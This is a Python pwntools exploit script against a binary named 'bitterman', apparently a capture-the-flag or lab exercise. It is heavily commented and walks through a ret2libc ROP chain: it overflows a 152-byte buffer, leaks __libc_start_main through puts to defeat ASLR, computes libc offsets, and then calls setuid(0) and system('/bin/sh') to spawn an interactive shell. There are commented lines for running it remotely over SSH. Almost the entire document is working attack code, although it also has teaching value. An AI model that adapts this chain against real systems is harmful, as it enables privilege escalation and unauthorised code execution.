#!/usr/bin/python3
# -*- coding: utf-8 -*-
from pwn import *

# If the exploit is executed locally use the terminal configuration and gdb.debug
# io = gdb.debug(['./bitterman'], 'break main')
io = process('./bitterman')

# If the exploit is executed remotelly use ssh
# s = ssh(host = 'IP', user = 'username', password = 'password')
# p = s.process('/path/to/the/binary')

context(os='linux', arch='amd64')
context.log_level = 'DEBUG'

# Offset to %rsp is 152. encode() converts the string into bytes.
junk = ("A" * 152).encode()
# ROP_TOOL or ropper --search 'pop r?i'
# The instrucction we have decided to execute: 0x0000000000400853: pop rdi; ret; 
pop_rdi = p64(0x400853)
# VARIANTE MAIN - objdump -D ./bitterman | grep main 
# 600c68 <__libc_start_main@GLIBC_2.2.5>
got_main = p64(0x600c68)
# objdump -D ./bitterman | grep puts
# Location of PUTS in the Procedure Linkage Table (PLT): 0000000000400520 <puts@plt>:
plt_puts = p64(0x400520)
# # objdump -D ./bitterman | grep main
# Location of MAIN in the Procedure Linkage Table (PLT): 00000000004006ec <main>:
plt_main = p64(0x4006ec)
# VARIANTE MAIN - readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep main
# 2228: 0000000000026ad0   446 FUNC    GLOBAL DEFAULT   14 __libc_start_main@@GLIBC_2.2.5
libc_main = p64(0x26ad0)
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# 1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
libc_system = p64(0x46ff0)
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep 'setuid'
# 25: 00000000000c8920   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5
libc_setuid = p64(0xc8920)
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep 'bin/sh'
# 183cee /bin/sh
libc_binsh = p64(0x183cee)

# The first part of the exploit would leak a real address, that we can use as a point of reference. 
# gadget_leak = pop_rdi + got_main + plt_puts
# 1. The first 152 junk characters will overwrite till we reach the position in memory of the stack pointer %rsp.  
# 	%rsp is the stack pointer, which points to the top of the current stack frame. 
# 2. We overwrite the stack pointer %rsp with the memory location 0x400853, which has the instructions "pop rdi; ret;"
# 3. “pop rdi;” is going to take the first value of the stack and put it into the register %rdi.
#	Popping means restoring whatever is on top of the stack into a register. 
# 	In other words, we can put an "argument" into the register %rdi, and that is the address to Global Offset Table (GOT) GLIBC # 600c68 <__libc_start_main@GLIBC_2.2.5>.
# 4. "ret;" transfers program control to a return address located on %rsp.  
#	The return is going to be the address of %rsp, but now with the Procedure Linkage Table (PLT): 400520 <puts@plt>.
# 	int puts(const char *str) writes a string to stdout up to but not including the null character. A newline character is appended to the output.
# 5. %rsp point now to 400520 <puts@plt>, puts uses %rdi (the first register) as an argument, executes itself with this argument, leaks the global location of <__libc_start_main@GLIBC_2.2.5> and crashes.
# 	In other words, the "Local" PUT (0x400520) is going to take the argument in %rdi (<__libc_start_main@GLIBC_2.2.5>) and leak this information.
# 6. We do not want the exploit to crush because the ASLR makes the address of libc change every time we restart. 
gadget_leak = pop_rdi + got_main + plt_puts + plt_main

# Interaction with the program.
io.recvuntil("name?")
io.sendline("Daniel")
io.recvuntil("message:")
io.sendline("1024")
io.recvuntil("text:")
io.sendline(junk + gadget_leak)
io.recvuntil("Thanks!")

# We leaked the address of  <__libc_start_main@GLIBC_2.2.5>
leaked_main = io.recv()[:8].strip().ljust(8, b'\x00')
log.info(f'Leaked libc_start_main@GLIBC location: {leaked_main.hex()}')

# Now we calculate the offset between main@glibc and main@leaked
offset = u64(leaked_main) - u64(libc_main)
log.info(f'Offsset from libc to current location: {offset}')

# Little endian for the exploit
system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='little')
setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='little')
binsh_loc = (u64(libc_binsh) + offset).to_bytes(8, byteorder='little')

# Big endian for the test in GDB, so we do not need to turn around the addresses.
# system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='big')
# setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='big')
# binsh_loc = (u64(libc_binsh) + offset).to_bytes(8, byteorder='big')

log.info(f'System location: {system_loc.hex()}')
log.info(f'setuid location: {setuid_loc.hex()}')
log.info(f'/bin/sh location: {binsh_loc.hex()}')

# Gadget to Code Execution 
gadget_rce = pop_rdi + p64(0) + setuid_loc
gadget_rce += pop_rdi + binsh_loc + system_loc

# Interaction with the program
io.sendline(" ")
io.recvuntil("message:")
io.sendline("1024")
io.recvuntil("text:")
io.sendline(junk + gadget_rce)
io.interactive()
